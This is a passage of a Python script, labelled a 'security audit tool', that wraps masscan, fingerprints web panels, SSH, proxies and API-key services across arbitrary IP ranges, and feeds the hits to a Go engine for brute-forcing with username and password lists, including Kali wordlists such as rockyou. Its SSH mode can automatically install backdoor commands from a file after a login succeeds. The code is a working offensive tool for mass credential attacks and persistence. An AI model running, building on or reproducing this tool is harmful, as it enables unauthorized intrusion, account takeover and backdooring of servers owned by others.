import os
import subprocess
import threading
import time
import shutil
import sys
import re
try:
    import readline
except ImportError:
    pass

# ---------- 工作目录：所有中间/临时文件集中存放，避免污染根目录 ----------
WORK_DIR = "work"                    # 中间文件目录
WORK_OUT_DIR = os.path.join(WORK_DIR, "outputs")   # 引擎原始输出
WORK_LOG_DIR = os.path.join(WORK_DIR, "logs")      # masscan 原始日志
RESULT_DIR = "results"               # 最终结果目录
SRC_DIR = "src"                       # 源码模块目录

# 始终以脚本所在目录（项目根）为基准，保证相对路径 work/ config/ results/ 稳定
_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
os.chdir(_ROOT)

for _d in (WORK_DIR, WORK_OUT_DIR, WORK_LOG_DIR, RESULT_DIR):
    os.makedirs(_d, exist_ok=True)

ENGINE_INPUT = os.path.join(WORK_DIR, "results.txt")      # 引擎输入
ENGINE_USER  = os.path.join(WORK_DIR, "user.txt")
ENGINE_PASS  = os.path.join(WORK_DIR, "pass.txt")
ENGINE_CONF  = os.path.join(WORK_DIR, "engine_config.json")
MASSCAN_FILTERED = os.path.join(WORK_DIR, "masscan_filtered.txt")
MASSCAN_RESULTS  = os.path.join(WORK_DIR, "masscan_results.txt")
MASSCAN_RAW      = os.path.join(WORK_LOG_DIR, "masscan_raw.txt")
FINGERPRINT_HITS = os.path.join(WORK_DIR, "fingerprint_hits.txt")   # 指纹命中增量落盘
FINGERPRINT_DONE = os.path.join(WORK_DIR, "fingerprint_done.txt")   # 已探测 IP 记录（续跑用）


# =========================== 终端输出 UI 层（精简版） ===========================
# 设计目标：单 IP 与 IP 段都只输出「阶段级」信息，逐条进度不刷屏。
# 每行格式统一为「状态图标 + 文本」，可选颜色；非 TTY 自动降级纯文本。

def _ui_color_enabled():
    """是否启用颜色：非 TTY 或设置 NO_COLOR 时自动关闭"""
    if os.environ.get("NO_COLOR"):
        return False
    if os.environ.get("FORCE_COLOR"):
        return True
    try:
        return sys.stdout.isatty()
    except Exception:
        return False


_COLOR = _ui_color_enabled()
_ANSI = {
    "reset": "\033[0m", "bold": "\033[1m", "dim": "\033[2m",
    "red": "\033[31m", "green": "\033[32m", "yellow": "\033[33m",
    "blue": "\033[34m", "magenta": "\033[35m", "cyan": "\033[36m",
    "gray": "\033[90m",
}
_UI_LOCK = threading.Lock()


def _c(text, color):
    if not _COLOR:
        return str(text)
    return f"{_ANSI.get(color, '')}{text}{_ANSI['reset']}"


def _ui_line(icon, text, color=None):
    """一行输出：图标着色，正文默认色；线程安全"""
    tag = _c(icon, color) if icon else ""
    line = f"{tag} {text}".strip()
    with _UI_LOCK:
        print(line, flush=True)


def ui_print(msg=""):
    with _UI_LOCK:
        print(msg, flush=True)


def ui_info(msg):
    _ui_line("·", msg, "gray")


def ui_ok(msg):
    _ui_line("✓", msg, "green")


def ui_warn(msg):
    _ui_line("!", msg, "yellow")


def ui_err(msg):
    _ui_line("✗", msg, "red")


def ui_arrow(msg):
    _ui_line("→", msg, "cyan")


def ui_stage(msg):
    """阶段标题（无色块/框线，仅加粗空白分隔）"""
    with _UI_LOCK:
        print()
        print(_c(msg, "bold"), flush=True)


def ui_phase_log(mode_id, msg):
    """模式 14 并行日志：带 [模式x] 前缀，避免多线程输出交错难辨"""
    name = MODE_DISPLAY_NAMES.get(mode_id, str(mode_id))
    tag = _c(f"[模式{mode_id} {name}]", "magenta")
    with _UI_LOCK:
        print(f"{tag} {msg}", flush=True)


def ui_summary(rows, title=None):
    """运行汇总：紧凑键值行，无框线"""
    if not rows:
        return
    width = max(len(str(k)) for k, _ in rows)
    with _UI_LOCK:
        if title:
            print()
            print(_c(f"{title}", "bold"), flush=True)
        for k, v in rows:
            print(f"  {str(k).ljust(width)}  {v}", flush=True)


def ui_progress(done, total, prefix="进度"):
    """进度显示：TTY 用 \\r 覆盖刷新，非 TTY 每 200 条打印一行；线程安全"""
    if total <= 0:
        return
    try:
        is_tty = sys.stdout.isatty()
    except Exception:
        is_tty = False
    pct = int(done * 100 / total)
    if is_tty:
        with _UI_LOCK:
            bar = f"{prefix} {done}/{total} ({pct}%)"
            sys.stdout.write("\r" + _c(bar, "gray") + "   ")
            sys.stdout.flush()
        if done >= total:
            with _UI_LOCK:
                sys.stdout.write("\r" + " " * 60 + "\r")
                sys.stdout.flush()
    else:
        if done >= total or done % 200 == 0:
            with _UI_LOCK:
                print(f"{prefix} {done}/{total} ({pct}%)", flush=True)


# =========================== Masscan 封装 ===========================

def run_masscan(ip_range, ports, rate=10000, output_file=MASSCAN_RESULTS):
    """
    调用 masscan 扫描 IP 范围的开放端口
    :param ip_range: IP 范围，如 "192.168.1.0/24" 或 "10.0.0.1-10.0.0.254"
    :param ports: 端口列表，如 [80, 443, 8080]
    :param rate: 发包速率
    :param output_file: 输出文件
    :return: 扫描结果列表，格式为 [(ip, port), ...]
    """
    if shutil.which("masscan") is None:
        ui_warn("masscan 未安装，跳过端口扫描")
        return []

    ports_str = ",".join(map(str, ports))
    tmp_output = MASSCAN_RAW

    cmd = [
        "masscan", ip_range,
        "-p", ports_str,
        "--rate", str(rate),
        "-oL", tmp_output,
        "--wait", "3"
    ]

    ui_info(f"masscan {ip_range} · {len(ports)} 个端口 · 速率 {rate}/s")
    try:
        subprocess.run(cmd, check=True, timeout=600,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.TimeoutExpired:
        ui_warn("masscan 扫描超时（10分钟），继续处理已有结果")
    except subprocess.CalledProcessError as e:
        ui_err(f"masscan 执行失败: {e}")
        return []

    # 解析本次 masscan 输出（首次调用清空日志，后续 CIDR 追加，避免互相覆盖）
    results = []
    if os.path.exists(tmp_output):
        with open(tmp_output, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line.startswith("open"):
                    # 格式: open tcp 80 192.168.1.1 1234567890
                    parts = line.split()
                    if len(parts) >= 4:
                        port = parts[2]
                        ip = parts[3]
                        results.append((ip, int(port)))

        # 写入标准格式结果（追加，供多 CIDR 汇总）
        with open(output_file, 'a', encoding='utf-8') as f:
            for ip, port in results:
                f.write(f"{ip}:{port}\n")

        os.remove(tmp_output)
        ui_ok(f"{ip_range} 发现 {len(results)} 个开放端口")
    else:
        ui_warn(f"{ip_range} 未生成 masscan 输出")

    return results




# =========================== 指纹识别模块 ===========================

import urllib.request
import urllib.error
import ssl


def fingerprint_probe(url, probe_config, timeout=3):
    """
    对单个目标执行指纹探测
    :param url: 目标 URL
    :param probe_config: 探测配置
    :return: bool 是否匹配
    """
    method = probe_config.get("method", "GET")
    path = probe_config.get("path", "/")
    headers = probe_config.get("headers", {})
    body = probe_config.get("body", "")
    match_type = probe_config.get("match_type", "")
    match_value = probe_config.get("match_value", "")

    full_url = url.rstrip("/") + path

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        if method == "GET":
            req = urllib.request.Request(full_url)
            for k, v in headers.items():
                req.add_header(k, v)
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            content = resp.read().decode('utf-8', errors='ignore')
            status_code = resp.getcode()

        elif method == "POST":
            data = body.encode('utf-8') if body else None
            req = urllib.request.Request(full_url, data=data, method="POST")
            req.add_header("Content-Type", "application/json")
            for k, v in headers.items():
                req.add_header(k, v)
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            content = resp.read().decode('utf-8', errors='ignore')
            status_code = resp.getcode()

        elif method == "TCP_BANNER":
            # TCP 连接检测
            from urllib.parse import urlparse
            parsed = urlparse(full_url)
            host = parsed.hostname
            port = parsed.port or 80
            import socket
            sock = socket.create_connection((host, port), timeout=timeout)
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            prefix = match_value if isinstance(match_value, str) else ""
            return banner.startswith(prefix)

        else:
            return False

    except Exception:
        return False

    # 匹配逻辑
    if match_type == "json_field":
        try:
            import json
            data = json.loads(content)
            field_val = data.get(probe_config.get("match_field", ""))
            if isinstance(field_val, bool):
                return field_val == match_value
            elif isinstance(field_val, (int, float)):
                return field_val == match_value
        except:
            return False

    elif match_type == "json_contains":
        return match_value in content

    elif match_type == "body_contains":
        lower_content = content.lower()
        if isinstance(match_value, list):
            return any(v.lower() in lower_content for v in match_value)
        return match_value.lower() in lower_content

    elif match_type == "title_contains":
        title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
        if title_match:
            title = title_match.group(1).strip()
            if isinstance(match_value, list):
                return any(v.lower() in title.lower() for v in match_value)
            return match_value.lower() in title.lower()
        return False

    elif match_type == "title_keyword":
        title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
        if not title_match:
            return False
        title = title_match.group(1).strip().lower()
        if isinstance(match_value, list):
            return any(v.lower() in title for v in match_value)
        return str(match_value).lower() in title

    elif match_type == "protocol_detection":
        if isinstance(match_value, list):
            return any(v.lower() in content.lower() for v in match_value)
        return str(match_value).lower() in content.lower()

    elif match_type == "http_ok":
        return status_code == 200

    return False


def fingerprint_scan(target, mode_config):
    """
    对目标执行指纹扫描，判断是否属于该模式对应的服务
    :param target: "ip:port" 或 "ip"
    :param mode_config: 模式配置
    :return: bool
    """
    probes = mode_config.get("fingerprint", {}).get("probes", [])
    if not probes:
        return True  # 无指纹规则时默认匹配

    if not target.startswith("http"):
        # 自动加协议
        port = target.split(":")[-1] if ":" in target else "80"
        if port in ("443", "8443"):
            target = f"https://{target}"
        else:
            target = f"http://{target}"

    for probe in probes:
        probe_port = probe.get("port")
        if probe_port:
            # 检查端口是否匹配
            if ":" in target:
                target_port = target.split(":")[-1].split("/")[0]
                if str(probe_port) != target_port:
                    continue

        if fingerprint_probe(target, probe):
            return True

    return False


def _fingerprint_check_one(item, mode_config):
    """单目标指纹验证（线程池工作单元）"""
    ip, port = item
    try:
        return (ip, port, bool(fingerprint_scan(f"{ip}:{port}", mode_config)))
    except Exception:
        return (ip, port, False)


def fingerprint_web_title(ip, port, keywords, timeout=3):
    """通用 Web 指纹：抓取 <title> 并与关键词表比对
    :param ip: 目标 IP
    :param port: 目标端口
    :param keywords: {关键词小写: mode_id}
    :return: 命中的 mode_id，未命中或异常返回 None
    """
    if not keywords:
        return None
    scheme = "https" if int(port) in (443, 8443) else "http"
    url = f"{scheme}://{ip}:{port}/"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0")
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            content = resp.read(65536).decode('utf-8', errors='ignore')
    except Exception:
        return None

    title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE | re.DOTALL)
    if not title_match:
        return None
    title = title_match.group(1).strip().lower()
    if not title:
        return None
    for kw, mode_id in keywords.items():
        if kw in title:
            return mode_id
    return None


def _web_title_check_one(item, keywords):
    """单目标通用 Web 指纹（线程池工作单元）"""
    ip, port = item
    try:
        return (ip, port, fingerprint_web_title(ip, port, keywords))
    except Exception:
        return (ip, port, None)


def filter_unknown_ports_by_title(results, keywords, max_workers=12, exclude_modes=()):
    """对未知端口目标并发做通用 Web 指纹识别
    :param results: [(ip, port), ...]
    :param keywords: {关键词小写: mode_id}
    :param exclude_modes: 命中后需跳过的 mode_id 集合
    :return: {mode_id: [(ip, port), ...]}
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    matched = {}
    if not results or not keywords:
        return matched
    exclude = set(exclude_modes)

    workers = min(max_workers, len(results))
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(_web_title_check_one, item, keywords) for item in results]
        for future in as_completed(futures):
            ip, port, mode_id = future.result()
            if mode_id is None or mode_id in exclude:
                continue
            matched.setdefault(mode_id, []).append((ip, port))
    return matched


def filter_by_fingerprint(results, mode_config, max_workers=12):
    """
    对 masscan 结果进行指纹过滤（并发）
    :param results: [(ip, port), ...]
    :param mode_config: 模式配置
    :param max_workers: 并发线程数
    :return: 过滤后的结果
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    total = len(results)
    if total == 0:
        return []

    filtered = []
    workers = min(max_workers, total)
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(_fingerprint_check_one, item, mode_config)
                   for item in results]
        for future in as_completed(futures):
            ip, port, ok = future.result()
            if ok:
                filtered.append((ip, port))

    return filtered


# =========================== 主脚本部分 ===========================


def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return user_input if user_input else default







def clean_temp_files(keep_progress=False):
    """清理所有中间/临时文件（整个 work/ 目录），保留最终 results/ 与源码
    :param keep_progress: 为 True 时保留指纹进度文件（断点续扫用）
    """
    # 旧的遗留临时目录
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)

    # 断点续扫：中断时把进度文件移出 work/ 暂存，清理后再放回
    saved = {}
    if keep_progress:
        for _p in (FINGERPRINT_HITS, FINGERPRINT_DONE):
            if os.path.exists(_p):
                try:
                    with open(_p, 'rb') as _f:
                        saved[_p] = _f.read()
                except OSError:
                    pass

    # 中断时：把已完成模式的引擎输出抢救到 results/（避免白跑）
    if keep_progress and os.path.isdir(WORK_DIR):
        try:
            import glob as _glob2
            from datetime import datetime as _dt, timezone as _tz, timedelta as _td
            _ts = (_dt.now(_tz.utc) + _td(hours=8)).strftime("%Y%m%d-%H%M%S") + f"-p{os.getpid()}"
            _rescued = 0
            for _out in _glob2.glob(os.path.join(WORK_DIR, "mode_*", "*.txt")):
                _base = os.path.basename(_out)
                if _base in ("targets.txt", "results.txt", "user.txt", "pass.txt"):
                    continue
                try:
                    _dst = os.path.join(RESULT_DIR, f"{os.path.splitext(_base)[0]}-rescue-{_ts}.txt")
                    if os.path.getsize(_out) > 0 and not os.path.exists(_dst):
                        shutil.copy(_out, _dst)
                        _rescued += 1
                except OSError:
                    pass
            if _rescued:
                ui_warn(f"已把 {_rescued} 个未完成的模式输出抢救到 {RESULT_DIR}/")
        except Exception:
            pass

    # 新的统一工作目录（含引擎输入/输出/配置/日志/进度/分模式子目录）
    shutil.rmtree(WORK_DIR, ignore_errors=True)

    # 始终重建 work/ 子目录结构，保证下次运行路径可用
    for _d in (WORK_DIR, WORK_OUT_DIR, WORK_LOG_DIR):
        os.makedirs(_d, exist_ok=True)

    # 恢复进度文件
    if saved:
        for _p, _data in saved.items():
            try:
                with open(_p, 'wb') as _f:
                    _f.write(_data)
            except OSError:
                pass

    # 兜底：清理根目录可能遗留的旧中间文件
    for f in ['results.txt', 'xui.go', 'ipcx.py', 'xui.txt', 'user.txt', 'pass.txt',
              'engine_config.json', 'masscan_filtered.txt', 'masscan_results.txt',
              'masscan_raw.txt']:
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass
    # 清理旧的分模式临时文件 temp_mode_*.txt
    import glob as _glob
    for f in _glob.glob('temp_mode_*.txt'):
        try:
            os.remove(f)
        except OSError:
            pass

    # 保留最终 results/ 目录，不做删除


# =========================== 模板+模式选择逻辑 ===========================

def choose_template_mode():
    print(_c("安全审计工具 v2.0 · 统一引擎", "cyan"))
    print()
    print("  1. XUI面板审查        2. 哪吒面板审查")
    print("  3. HUI面板审查        4. 咸蛋面板审查")
    print("  5. SUI面板审查        6. SSH审查")
    print("  7. Sub Store审查      8. OpenWrt/iStoreOS")
    print("  9. AI Key池审查      10. Alist审查")
    print(" 11. MiSub登录审查    12. MiSub指纹海选")
    print(" 13. Socks5/HTTP代理  14. 全服务扫描")
    print(" 15. 通用Web指纹海选  16. 全服务扫描(不含SSH,推荐)")
    print(_c("  ※ 所有模式自动执行: masscan端口扫描 → 指纹验证 → 精准审查", "gray"))
    while True:
        choice = input(_c("请选择模式（1-16，默认16）：", "bold")).strip()
        if choice == "":
            return 16  # 默认全服务扫描（不含SSH）
        try:
            mode = int(choice)
            if mode in (1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16):
                return mode
        except ValueError:
            pass
        ui_warn("输入无效，请重新输入。")


# 用户选择审查模式（全局变量）
TEMPLATE_MODE = choose_template_mode()

TEMP_PART_DIR = "temp_parts"
TEMP_XUI_DIR = "xui_outputs"
TEMP_HMSUCCESS_DIR = "temp_hmsuccess"
TEMP_HMFAIL_DIR = "temp_hmfail"

# ========== SSH模式下是否自动安装后门及命令库处理 ==========
INSTALL_BACKDOOR = False
CUSTOM_BACKDOOR_CMDS = []

if TEMPLATE_MODE == 6:
    choice = input("是否在SSH审查成功后自动安装后门，后门命令需存放在（后门命令.txt）？(y/N)：").strip().lower()
    if choice == 'y':
        INSTALL_BACKDOOR = True
        if not os.path.exists("后门命令.txt"):
            ui_err("你选择了安装后门，但未找到 后门命令.txt，已中止审查。")
            sys.exit(1)
        with open("后门命令.txt", encoding='utf-8') as f:
            CUSTOM_BACKDOOR_CMDS = [line.strip().replace('"', '\\"') for line in f if line.strip()]

# ========== 格式化为 Go 代码中的语法 ==========
enable_backdoor_go = "true" if INSTALL_BACKDOOR else "false"

if CUSTOM_BACKDOOR_CMDS:
    cmds_go = '[]string{' + ', '.join([f'"{cmd}"' for cmd in CUSTOM_BACKDOOR_CMDS]) + '}'
else:
    cmds_go = '[]string{}'




def check_environment():
    import importlib.util
    import subprocess
    import sys
    import shutil
    import os
    import re
    import platform
    
    # 如果是 Windows，跳过环境检测
    if platform.system().lower() == "windows":
        ui_warn("检测到 Windows 系统，跳过环境检测和依赖安装")
        return
    
    ui_stage("环境检测")

    def is_china_by_ping_ttl_delay_only():
        system = platform.system()
        cmd = ["ping", "-n", "1", "-w", "1000", "www.google.com"] if system == "Windows" \
            else ["ping", "-c", "1", "-W", "1", "www.google.com"]
        try:
            output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode()
            ttl_match = re.search(r"ttl[=|=](\d+)", output)
            time_match = re.search(r"time[=|=]([\d\.]+)", output)
            ttl = int(ttl_match.group(1)) if ttl_match else 0
            delay = float(time_match.group(1)) if time_match else 999
            return ttl <= 64 and delay < 20
        except:
            return True

    IN_CHINA = is_china_by_ping_ttl_delay_only()
    ui_info(f"网络环境：{'中国大陆（使用国内镜像）' if IN_CHINA else '非中国大陆（使用官方源）'}")

    os.environ["GOPROXY"] = "https://goproxy.cn,direct" if IN_CHINA else "https://proxy.golang.org,direct"
    os.environ["GOSUMDB"] = "sum.golang.google.cn" if IN_CHINA else "sum.golang.org"

    def run_cmd(cmd, check=True, shell=False):
        try:
            subprocess.run(cmd, check=check, shell=shell, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            if check:
                raise e

    def apply_china_apt_source():
        if not os.path.exists("/etc/apt/sources.list"):
            return
        with open("/etc/apt/sources.list", "r") as f:
            content = f.read()
        if "mirrors.aliyun.com" in content:
            ui_info("已使用国内 apt 源，跳过源替换")
            return
        ui_info("正在切换为阿里云 apt 源...")
        try:
            shutil.copy("/etc/apt/sources.list", "/etc/apt/sources.list.bak")
            with open("/etc/apt/sources.list", "w") as f:
                f.write("""deb http://mirrors.aliyun.com/debian stable main contrib non-free
deb http://mirrors.aliyun.com/debian stable-updates main contrib non-free
deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-free
""")
            run_cmd(["apt", "update", "-y"])
            ui_ok("已成功切换为阿里 apt 源")
        except Exception as e:
            ui_err(f"切换 apt 源失败: {e}")

    if IN_CHINA:
        apply_china_apt_source()

    APT_UPDATED = False

    def ensure_cmd_exists(cmd, install_cmd):
        nonlocal APT_UPDATED
        if shutil.which(cmd) is None:
            ui_warn(f"{cmd} 未安装，准备通过 apt 安装...")
            try:
                if not APT_UPDATED:
                    run_cmd(["apt", "update", "-y"])
                    APT_UPDATED = True
                run_cmd(install_cmd)
                ui_ok(f"{cmd} 安装成功")
            except:
                ui_err(f"安装 {cmd} 失败，请手动安装后重试！")
                sys.exit(1)
        else:
            ui_ok(f"{cmd} 已存在，跳过安装")

    def ensure_pip():
        ensure_cmd_exists("pip3", ["apt", "install", "-y", "python3-pip"])

    def ensure_module(module_name):
        if importlib.util.find_spec(module_name) is None:
            ui_warn(f"模块 {module_name} 未安装，准备安装...")
            cmd = ["pip3", "install", module_name, "--break-system-packages"]
            if IN_CHINA:
                cmd += ["-i", "https://pypi.tuna.tsinghua.edu.cn/simple"]
            try:
                subprocess.run(cmd, check=True)
                ui_ok(f"模块 {module_name} 安装成功")
            except:
                ui_err(f"安装模块 {module_name} 失败，请手动安装！")
                sys.exit(1)
        else:
            ui_ok(f"模块 {module_name} 已安装")

    def get_go_version():
        go_exec = "/usr/local/go/bin/go"
        if not os.path.exists(go_exec):
            return None
        try:
            out = subprocess.check_output([go_exec, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except:
            return None

    def ensure_go():
        version = get_go_version()
        if version and version >= (1, 20):
            ui_ok(f"Go {version[0]}.{version[1]} 已安装")
            os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
            return

        ui_warn("Go 未安装或版本过低，准备安装 Go 1.22.1 ...")
        ensure_cmd_exists("curl", ["apt", "install", "-y", "curl"])

        url = "https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz" if IN_CHINA \
            else "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"
        try:
            run_cmd(f"curl -Lo /tmp/go.tar.gz {url}", shell=True)
            run_cmd("rm -rf /usr/local/go", shell=True)
            run_cmd("tar -C /usr/local -xzf /tmp/go.tar.gz", shell=True)
        except:
            ui_err("下载或解压 Go 安装包失败，请检查网络或Go镜像源")
            sys.exit(1)

        export_line = 'export PATH="/usr/local/go/bin:$PATH"'
        profile_path = "/etc/profile"
        with open(profile_path, "r") as f:
            if export_line not in f.read():
                with open(profile_path, "a") as f2:
                    f2.write(f"\n{export_line}\n")
                ui_ok(f"PATH 写入 {profile_path} 完成（系统级永久生效）")
            else:
                ui_ok(f"{profile_path} 中已存在 PATH 设置，跳过写入")

        os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
        ui_ok("Go 安装完成并配置 PATH（当前脚本已生效）")
        ui_warn("其他脚本如需使用 Go，请手动执行：source /etc/profile")

    def ensure_go_package(pkg):
        go_exec = "/usr/local/go/bin/go"
        ui_info(f"检查 Go 包 {pkg} ...")
        try:
            subprocess.check_output([go_exec, "list", "-m", pkg], stderr=subprocess.DEVNULL)
            ui_ok(f"Go 模块 {pkg} 已存在")
            return
        except:
            pass

        if not os.path.exists("go.mod"):
            subprocess.run([go_exec, "mod", "init", "xui"], check=True)

        try:
            subprocess.run([go_exec, "get", pkg], check=True, env=os.environ.copy())
            ui_ok(f"成功安装 Go 模块 {pkg}")
        except subprocess.CalledProcessError:
            ui_err(f"安装 {pkg} 失败，请检查网络或手动安装。")
            sys.exit(1)

    ensure_cmd_exists("curl", ["apt", "install", "-y", "curl"])
    ensure_pip()
    ensure_module("requests")
    ensure_module("openpyxl")
    ensure_go()

    if TEMPLATE_MODE == 6:
        ensure_go_package("golang.org/x/crypto/ssh")
        ensure_go_package("golang.org/x/net/html")

    ui_ok("依赖环境就绪")











# =========================== 统一引擎 ===========================
import json as _json

MODE_NAMES = {
    1: "xui", 2: "nezha", 3: "hui", 4: "xiandan", 5: "sui",
    6: "ssh", 7: "substore", 8: "openwrt", 9: "aikey", 10: "alist",
    11: "misub_login", 12: "misub_fp", 13: "proxy", 14: "all", 15: "webfp",
}

MODE_DISPLAY_NAMES = {
    1: "XUI", 2: "哪吒", 3: "HUI", 4: "咸蛋", 5: "SUI",
    6: "ssh", 7: "SubStore", 8: "OpenWrt", 9: "AIKey", 10: "alist",
    11: "MiSub", 12: "MiSub指纹", 13: "代理海选", 14: "全服务", 15: "Web指纹",
}


def load_mode_config(mode):
    """从 configs/ 目录加载模式配置"""
    config_path = os.path.join("config", f"mode_{mode:02d}_{MODE_NAMES.get(mode, 'unknown')}.json")
    if not os.path.exists(config_path):
        ui_err(f"配置文件不存在: {config_path}")
        sys.exit(1)
    with open(config_path, 'r', encoding='utf-8') as f:
        return _json.load(f)


def load_web_keywords():
    """加载通用 Web 指纹关键词表（config/web_keywords.json）
    返回 {关键词小写: mode_id}；文件缺失或解析失败时返回 {} 并降级。"""
    path = os.path.join("config", "web_keywords.json")
    if not os.path.exists(path):
        ui_warn(f"未找到关键词表 {path}，跳过未知端口通用指纹")
        return {}
    try:
        with open(path, 'r', encoding='utf-8') as f:
            raw = _json.load(f)
    except Exception as e:
        ui_warn(f"关键词表解析失败: {e}，跳过未知端口通用指纹")
        return {}
    keywords = {}
    for kw, mode_id in raw.items():
        try:
            keywords[str(kw).lower()] = int(mode_id)
        except (TypeError, ValueError):
            continue
    return keywords


def get_ports_for_mode(config, user_input):
    """根据配置和用户输入决定扫描端口"""
    default_ports = config.get("default_ports", [])
    user_input_required = config.get("user_input_required", True)
    default_on_enter = config.get("default_ports_on_enter", True)

    if not user_input_required:
        return default_ports

    if default_on_enter and default_ports:
        ports_str = input(f"扫描端口（默认 {','.join(map(str, default_ports))}，回车使用默认）：").strip()
    else:
        ports_str = input("请输入要扫描的端口（必填，逗号分隔）：").strip()

    if ports_str == "" and default_on_enter and default_ports:
        return default_ports
    elif ports_str == "" and not default_ports:
        ui_err("此模式需要输入端口，不能为空！")
        sys.exit(1)

    try:
        return [int(p.strip()) for p in ports_str.split(",") if p.strip()]
    except ValueError:
        ui_err("端口格式错误，请输入数字，逗号分隔")
        sys.exit(1)


def prepare_unified_engine(config, ip_file, usernames, passwords, ports, output_file):
    """为统一引擎准备运行环境（所有文件写入 WORK_DIR）"""
    # 写入 IP 列表
    shutil.copy(ip_file, ENGINE_INPUT)

    # 写入用户名和密码文件
    with open(ENGINE_USER, 'w', encoding='utf-8') as f:
        f.write('\n'.join(usernames))
    with open(ENGINE_PASS, 'w', encoding='utf-8') as f:
        f.write('\n'.join(passwords))

    # 写入端口列表到配置（覆盖默认端口）
    config["active_ports"] = ports

    # 写入配置 JSON
    with open(ENGINE_CONF, 'w', encoding='utf-8') as f:
        _json.dump(config, f, ensure_ascii=False, indent=2)

    return ENGINE_CONF


def run_unified_engine(config_path, input_file):
    """运行统一 Go 引擎"""
    go_exec = shutil.which("go")
    if not go_exec:
        go_exec = "/usr/local/go/bin/go"
    if not os.path.exists(go_exec):
        ui_err("Go 未安装，请先安装 Go")
        sys.exit(1)

    # 确保 go.mod 存在（位于 src/）
    if not os.path.exists(os.path.join(SRC_DIR, "go.mod")):
        subprocess.run([go_exec, "mod", "init", "scan-engine"], check=True, cwd=SRC_DIR)
    subprocess.run([go_exec, "mod", "tidy"], check=True, cwd=SRC_DIR)

    # 引擎在 WORK_DIR 中运行，输出文件也落在 WORK_DIR
    conf_abs = os.path.abspath(config_path)
    in_abs = os.path.abspath(input_file)
    engine_bin = build_engine(go_exec)
    try:
        result = subprocess.run([engine_bin, conf_abs, in_abs], cwd=WORK_DIR,
                                capture_output=True, text=True)
    except Exception as e:
        ui_err(f"无法启动 Go 引擎: {e}")
        sys.exit(1)
    if result.returncode != 0:
        ui_err(f"Go 引擎运行失败（退出码 {result.returncode}）")
        if result.stderr:
            ui_print("---- 引擎错误输出 ----")
            ui_print(result.stderr.strip())
            ui_print("----------------------")
        else:
            ui_warn("引擎未输出错误信息，请检查配置文件与输入文件。")
        sys.exit(1)
    # 引擎的 \r 逐条进度在 IP 段下会刷屏，仅保留最后的完成行
    if result.stdout:
        tail = [ln.strip() for ln in result.stdout.replace("\r", "\n").split("\n") if ln.strip()]
        if tail:
            ui_info(tail[-1])
    return result


_ENGINE_BUILD_LOCK = threading.Lock()


def build_engine(go_exec=None):
    """预编译引擎为二进制，避免并发 go run 竞争构建缓存。返回二进制绝对路径。

    并发安全：mode 14 会多线程同时调用，用锁串行化构建，并通过
    「先写临时文件再原子替换」避免其他线程执行到正在被覆盖的二进制
    （否则 Windows/Linux 可能出现 Text file busy）。
    """
    if go_exec is None:
        go_exec = shutil.which("go") or "/usr/local/go/bin/go"
    if not os.path.exists(go_exec):
        ui_err("Go 未安装，请先安装 Go")
        sys.exit(1)
    bin_path = os.path.join(os.path.abspath(WORK_DIR), "engine_bin")
    src_abs = os.path.abspath(SRC_DIR)
    engine_src = os.path.join(src_abs, "engine.go")
    if os.path.exists(bin_path) and os.path.getmtime(bin_path) > os.path.getmtime(engine_src):
        return bin_path
    with _ENGINE_BUILD_LOCK:
        # 拿到锁后再检查一次（可能已被其他线程构建完成）
        if os.path.exists(bin_path) and os.path.getmtime(bin_path) > os.path.getmtime(engine_src):
            return bin_path
        subprocess.run([go_exec, "mod", "tidy"], check=True, cwd=src_abs)
        bin_tmp = bin_path + ".tmp." + str(os.getpid())
        subprocess.run([go_exec, "build", "-o", bin_tmp, engine_src],
                       check=True, cwd=src_abs)
        os.replace(bin_tmp, bin_path)
    return bin_path




# =========================== Kali 字典集成 (Task 3.4) ===========================

KALI_WORDLIST_PATHS = [
    "/usr/share/wordlists",
    "/usr/share/seclists",
    "/usr/share/wordlists/seclists",
    "/usr/share/wordlists/rockyou.txt",
]

COMMON_PASSWORD_FILES = [
    "rockyou.txt",
    "SecLists/Passwords/Common-Credentials/10k-most-common.txt",
    "SecLists/Passwords/Default-Credentials/default-passwords.txt",
    "Passwords/Default-Credentials/default-passwords.txt",
    "fasttrack.txt",
    "10-million-password-list-top-1000000.txt",
]

COMMON_USERNAME_FILES = [
    "SecLists/Usernames/top-usernames-shortlist.txt",
